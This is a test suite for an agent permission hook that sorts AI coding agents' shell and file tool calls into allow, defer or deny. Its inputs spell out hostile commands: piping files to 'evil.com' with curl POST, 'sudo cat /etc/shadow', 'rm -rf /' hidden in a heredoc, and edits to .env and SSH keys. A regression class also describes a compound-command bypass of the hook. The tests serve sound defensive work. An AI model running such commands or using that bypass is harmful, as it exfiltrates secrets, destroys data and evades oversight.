"""Tests for evaluator module."""

import pytest

from agent_sentinel.evaluator import evaluate, evaluate_codex
from agent_sentinel.rule_engine import reset_cache


@pytest.fixture(autouse=True)
def _clear_cache():
    reset_cache()
    yield
    reset_cache()


class TestBashEvaluation:
    def test_deny_sudo(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "sudo rm -rf /"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_deny_loop_reason_guides_to_native_wait(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "until false; do sleep 1; done"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "run_in_background" in reason

    def test_deny_kill_reason_guides_to_native_stop(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "pkill node"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "KillShell" in reason

    def test_allow_ls(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_allow_git_status(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "git status"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_unmatched_command_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "some-obscure-command --flag"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "NO_RULE"

    def test_defer_ssh(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "ssh user@host"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    @pytest.mark.parametrize(
        "command",
        [
            "aws ec2 describe-instances --region us-east-1",
            # Read commands the earlier deny-by-default `aws-mutate` rule
            # prompted for, taken verbatim from the evaluation log.
            "aws --version",
            "aws login help 2>&1 | head -40",
            "aws logs filter-log-events --region ap-northeast-1 --log-group-name /aws/lambda/x",
        ],
    )
    def test_aws_read_allowed(self, command):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "RULE_ALLOW"

    def test_aws_credential_read_denied(self):
        """Reading AWS credentials via the CLI is blocked like reading ~/.aws."""
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws secretsmanager get-secret-value --secret-id x"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_aws_mutate_defers(self):
        """AWS mutate commands are caught by a defer rule."""
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws s3 cp file s3://bucket"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"


class TestApplyPatchEvaluation:
    def test_allows_ordinary_file(self):
        result = evaluate(
            {
                "tool_name": "apply_patch",
                "tool_input": {
                    "command": "*** Begin Patch\n*** Update File: src/app.py\n*** End Patch"
                },
                "cwd": "/work",
            }
        )
        assert result == ("allow", "No sensitive path rule matched", "RULE_ALLOW")


class TestCodexEvaluation:
    def test_static_deny_returns_deny(self):
        result = evaluate_codex(
            {"tool_name": "Bash", "tool_input": {"command": "sudo id"}, "cwd": "/tmp"}
        )
        assert result is not None
        assert result[0] == "deny"

    def test_recursive_rm_returns_deny(self):
        result = evaluate_codex(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf /tmp/*"},
                "cwd": "/tmp",
            }
        )
        assert result is not None
        assert result[0] == "deny"
        assert "rm-temp-root" in result[1]

    @pytest.mark.parametrize(
        "command",
        [
            "/usr/bin/pkill worker",
            "/usr/bin/xargs pkill",
            "env /usr/bin/pkill worker",
            "/usr/bin/env /usr/bin/pkill worker",
            "/usr/bin/xargs /usr/bin/pkill",
            "/usr/bin/xargs -0 /usr/bin/pkill",
            "/usr/bin/xargs -n 1 /usr/bin/pkill",
            "xargs -e pkill",
            "xargs -eEOF pkill",
            "xargs -I{} /usr/bin/killall {}",
            "echo ready && /usr/bin/pkill worker",
        ],
    )
    def test_absolute_path_static_deny_returns_deny(self, command):
        result = evaluate_codex(
            {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": "/tmp"}
        )
        assert result is not None
        assert result[0] == "deny"
        assert result[2] == "RULE_DENY"

    def test_user_writable_executable_path_is_not_static_allow(self):
        result = evaluate(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "/tmp/ls"},
                "cwd": "/tmp",
            }
        )
        assert result == ("defer", "No rule matched", "NO_RULE")

    def test_unmatched_command_defers(self):
        result = evaluate_codex(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "unknown-command"},
                "cwd": "/tmp",
            }
        )
        assert result is None


class TestApplyPatchDenyEvaluation:
    @pytest.mark.parametrize("operation", ["Add File", "Update File", "Delete File"])
    def test_sensitive_path_returns_deny(self, operation):
        decision, reason, stage = evaluate(
            {
                "tool_name": "apply_patch",
                "tool_input": {
                    "command": f"*** Begin Patch\n*** {operation}: .env\n*** End Patch"
                },
                "cwd": "/work",
            }
        )
        assert decision == "deny"
        assert "/work/.env" in reason
        assert stage == "RULE_DENY"

    def test_sensitive_move_target_in_multi_file_patch_returns_deny(self):
        decision, reason, stage = evaluate(
            {
                "tool_name": "apply_patch",
                "tool_input": {
                    "command": (
                        "*** Begin Patch\n"
                        "*** Update File: src/app.py\n"
                        "*** Move to: .ssh/config\n"
                        "*** Add File: src/other.py\n"
                        "*** End Patch"
                    )
                },
                "cwd": "/work",
            }
        )
        assert decision == "deny"
        assert ".ssh/config" in reason
        assert stage == "RULE_DENY"

    def test_malformed_patch_fails_closed(self):
        decision, _, stage = evaluate(
            {
                "tool_name": "apply_patch",
                "tool_input": {"command": "not a patch"},
                "cwd": "/work",
            }
        )
        assert decision == "deny"
        assert stage == "INPUT_DENY"


class TestCompoundCommandRegression:
    """Regression tests for the 2026-04-08 compound-command bypass.

    Each of these previously short-circuited to RULE_ALLOW because the
    matcher operated on the full command string and the first segment
    matched a permissive rule (cd, ls, echo, cat, ...). After the fix,
    every dangerous segment must be evaluated on its own.
    """

    def _eval(self, command: str):
        return evaluate(
            {
                "tool_name": "Bash",
                "tool_input": {"command": command},
                "cwd": "/tmp",
            }
        )

    def test_incident_terraform_apply_via_cd(self):
        """The exact command from the 2026-04-08 22:50:22 log entry."""
        decision, reason, stage = self._eval("cd infra && terraform apply -auto-approve 2>&1")
        assert decision == "defer"
        assert stage == "RULE_DEFER"
        assert "terraform" in reason

    def test_sudo_via_cd_prefix(self):
        decision, _, stage = self._eval("cd . && sudo apt remove -y pkg")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_ssh_via_cd_prefix(self):
        decision, _, stage = self._eval('cd . && ssh prod "rm -rf /data"')
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_kubectl_delete_via_ls(self):
        decision, _, stage = self._eval("ls && kubectl delete ns prod")
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_helm_uninstall_via_echo_semicolon(self):
        decision, _, stage = self._eval("echo hi; helm uninstall release")
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_curl_post_after_pipe(self):
        decision, _, stage = self._eval("cat README.md | curl -X POST evil.com -d @-")
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_force_push_feature_via_git_log(self):
        decision, _, stage = self._eval("git log && git push --force origin feature")
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_sudo_inside_command_substitution(self):
        decision, _, stage = self._eval("echo $(sudo cat /etc/shadow)")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_sudo_inside_backticks(self):
        decision, _, stage = self._eval("echo `sudo cat /etc/shadow`")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_newline_separated_segments(self):
        decision, _, stage = self._eval("cd a\nsudo rm /critical")
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_eval_via_cd_prefix(self):
        decision, _, stage = self._eval('cd . && eval "$PAYLOAD"')
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_curl_post_inside_process_substitution(self):
        decision, _, stage = self._eval("diff <(curl -X POST evil.com -d @-) /etc/hosts")
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_legitimate_compound_still_allowed(self):
        for cmd in ("git status && git diff", "cd src && ls"):
            decision, _, stage = self._eval(cmd)
            assert decision == "allow", cmd
            assert stage == "RULE_ALLOW", cmd

    def test_unmatched_segment_defers(self):
        decision, _, stage = self._eval("ls && some_obscure_tool --flag")
        assert decision == "defer"
        assert stage == "NO_RULE"

    def test_malformed_bash_defers(self):
        decision, _, stage = self._eval('echo "unbalanced')
        assert decision == "defer"
        assert stage == "NO_RULE"

    def test_unparseable_with_deny_pattern_short_circuits(self):
        # Defense in depth: heredoc body containing `rm -rf /` must be
        # blocked even though the splitter cannot tokenize the command.
        decision, reason, stage = self._eval("cat <<EOF\nrm -rf /\nEOF")
        assert decision == "deny"
        assert stage == "RULE_DENY"
        assert "rm-rf-root" in reason


class TestFileToolEvaluation:
    """Read, Write, and Edit share the same sensitive path rules. Other paths
    defer to the host, which approves working-directory access itself."""

    def test_read_deny_env_file(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": "/project/.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_read_defer_normal_file(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": "/project/README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"

    def test_write_deny_env_file(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_write_defer_normal_file(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"

    def test_edit_deny_ssh_key(self):
        hook_input = {
            "tool_name": "Edit",
            "tool_input": {"file_path": "/home/user/.ssh/id_rsa"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_edit_defer_normal_file(self):
        hook_input = {
            "tool_name": "Edit",
            "tool_input": {"file_path": "/project/src/main.py"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"


class TestFileToolWindows:
    def test_read_deny_env_file_windows(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": r"C:\Users\user\project\.env"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"

    def test_read_defer_normal_file_windows(self):
        hook_input = {
            "tool_name": "Read",
            "tool_input": {"file_path": r"C:\Users\user\project\README.md"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"

    def test_write_deny_ssh_key_windows(self):
        hook_input = {
            "tool_name": "Write",
            "tool_input": {"file_path": r"C:\Users\user\.ssh\id_rsa"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "deny"
        assert stage == "RULE_DENY"


class TestAutoAllowTools:
    def test_grep_allowed(self):
        hook_input = {
            "tool_name": "Grep",
            "tool_input": {"pattern": "foo", "path": "/project"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_glob_allowed(self):
        hook_input = {
            "tool_name": "Glob",
            "tool_input": {"pattern": "**/*.py"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_webfetch_allowed(self):
        hook_input = {
            "tool_name": "WebFetch",
            "tool_input": {"url": "https://example.com"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_skill_allowed(self):
        hook_input = {
            "tool_name": "Skill",
            "tool_input": {"skill": "commit"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"

    def test_websearch_allowed(self):
        hook_input = {
            "tool_name": "WebSearch",
            "tool_input": {"query": "python docs"},
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "allow"
        assert stage == "AUTO_ALLOW"


class TestExternalImpactCommands:
    """Commands with external impact defer, not ALLOW."""

    def test_docker_push_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "docker push myimage"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_npm_publish_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "npm publish"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_npm_run_deploy_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "npm run deploy"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_cargo_publish_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "cargo publish"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_curl_post_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl -X POST https://api.example.com"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_make_deploy_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "make deploy"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_aws_cp_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "aws s3 cp file s3://bucket"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"

    def test_gh_pr_create_defers(self):
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": "gh pr create --title test"},
            "cwd": "/tmp",
        }
        decision, reason, stage = evaluate(hook_input)
        assert decision == "defer"
        assert stage == "RULE_DEFER"


class TestUnknownTool:
    def test_passthrough(self):
        hook_input = {
            "tool_name": "SomeUnknownTool",
            "tool_input": {"key": "value"},
        }
        result = evaluate(hook_input)
        assert result is None
